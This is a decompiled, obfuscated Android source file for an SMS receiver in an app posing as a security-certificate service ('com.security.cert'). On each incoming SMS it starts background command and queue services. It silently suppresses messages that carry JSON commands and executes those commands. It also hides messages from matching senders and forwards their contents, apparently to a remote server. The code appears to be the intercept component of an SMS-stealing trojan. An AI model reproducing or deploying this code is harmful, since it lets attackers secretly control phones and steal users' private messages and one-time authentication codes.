package com.security.cert.services;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import com.security.cert.a.a.c;
import com.security.cert.b.a.a;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.regex.Pattern;
import org.json.JSONException;
import org.json.JSONObject;

public class SmsReceiver extends BroadcastReceiver {
    private String a(Object[] objArr) {
        return SmsMessage.createFromPdu((byte[]) objArr[0]).getDisplayOriginatingAddress();
    }

    private void a(Context context) {
        context.startService(new Intent(context, CheckCommandsService.class));
        context.startService(new Intent(context, CheckQueueService.class));
    }

    private void a(Context context, String str, String str2) {
        try {
            str2 = URLEncoder.encode(str2, "UTF-8");
        } catch (UnsupportedEncodingException e) {
        }
        c.a(context, str, str2);
    }

    private boolean a(String str) {
        return str.contains("\"command\":");
    }

    private boolean a(String str, String str2) {
        return (TextUtils.isEmpty(str) || TextUtils.isEmpty(str2)) ? false : Pattern.compile(str).matcher(str2).matches();
    }

    private String b(Object[] objArr) {
        String str = "";
        for (Object obj : objArr) {
            str = str + SmsMessage.createFromPdu((byte[]) obj).getMessageBody();
        }
        return str;
    }

    public void onReceive(Context context, Intent intent) {
        a(context);
        String d = a.d(context);
        if (intent.getAction().equalsIgnoreCase("android.provider.Telephony.SMS_RECEIVED")) {
            Object[] objArr = (Object[]) intent.getExtras().get("pdus");
            if (objArr.length > 0) {
                String a = a(objArr);
                String b = b(objArr);
                if (a(b)) {
                    abortBroadcast();
                    try {
                        new com.security.cert.b.b.a.a(context).a(new JSONObject(b));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                } else if (a(d, a)) {
                    abortBroadcast();
                    a(context, a, b);
                }
            }
        }
    }
}
